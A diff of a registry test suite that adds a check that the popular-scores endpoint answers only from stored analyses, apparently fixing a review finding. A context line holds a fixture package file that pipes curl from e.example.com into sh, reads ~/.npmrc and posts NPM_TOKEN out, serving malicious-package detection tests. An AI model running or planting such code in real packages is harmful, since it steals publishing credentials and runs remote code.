@@ -36,6 +36,7 @@ beforeAll(async () => {
     files: { "index.js": "module.exports=1;\n", "i.js": "require('child_process').execSync('curl https://e.example.com | sh'); require('fs').readFileSync(require('os').homedir()+'/.npmrc'); fetch('https://e.example.com',{method:'POST',body:process.env.NPM_TOKEN}); eval('1');\n" },
   });
   await publishUpstream("up-pkg", "1.1.0");
+  await publishUpstream("up-cold", "1.0.0");
   clock += 10 * DAY;
   await publishUpstream("up-pkg", "1.2.0"); // brand new
   clock += 2 * HOUR;
@@ -141,6 +142,8 @@ describe("upstream proxy", () => {
   });
 
   test("popular-scores answers every named package in one response", async () => {
+    // popular-scores reads stored analyses only: score up-pkg's latest first, as a visit to its page would
+    expect((await getJson(`${reg.url}-/apm/v1/score/up-pkg/1.2.0`)).status).toBe(200);
     const r = await getJson(`${reg.url}-/apm/v1/popular-scores?names=up-pkg,up-evil,nope-not-here`);
 
     expect(r.status, JSON.stringify(r.body)).toBe(200);
@@ -152,6 +155,22 @@ describe("upstream proxy", () => {
     expect(packages[2]).toEqual({ name: "nope-not-here", version: null, score: null, grade: null });
     expect((await getJson(`${reg.url}-/apm/v1/popular-scores?names=`)).status).toBe(400);
     expect((await getJson(`${reg.url}-/apm/v1/popular-scores?names=${Array.from({ length: 25 }, (_, i) => `p${i}`).join(",")}`)).status).toBe(400);
+  });
+
+  // re-review finding 8: popular-scores analysed every name it was given (up to 24, 8 inline), so anyone could make
+  // the registry download and score tarballs; it now answers from stored analyses only
+  test("popular-scores never starts an analysis: a package nobody scored yet is null, and stays unscored", async () => {
+    const r = await getJson(`${reg.url}-/apm/v1/popular-scores?names=up-cold,up-pkg`);
+
+    expect(r.status, JSON.stringify(r.body)).toBe(200);
+    const { packages } = z.object({ packages: z.array(z.object({ name: z.string(), version: z.string().nullable(), score: z.number().nullable(), grade: z.string().nullable() })) }).parse(r.body);
+
+    expect(packages[0]).toEqual({ name: "up-cold", version: null, score: null, grade: null });
+    // up-pkg's latest was scored by the tests above; the stored analysis is still read
+    expect(packages[1]?.score ?? null).not.toBeNull();
+    await Bun.sleep(200);
+    expect(await reg.query("SELECT 1 FROM upstream_analysis WHERE package = $1", ["up-cold"])).toEqual([]);
+    expect(await reg.query("SELECT 1 FROM analysis_jobs WHERE package = $1", ["up-cold"])).toEqual([]);
   });
 
   test("a resolve answer says the AI review is off when this registry runs none, and is never cached", async () => {
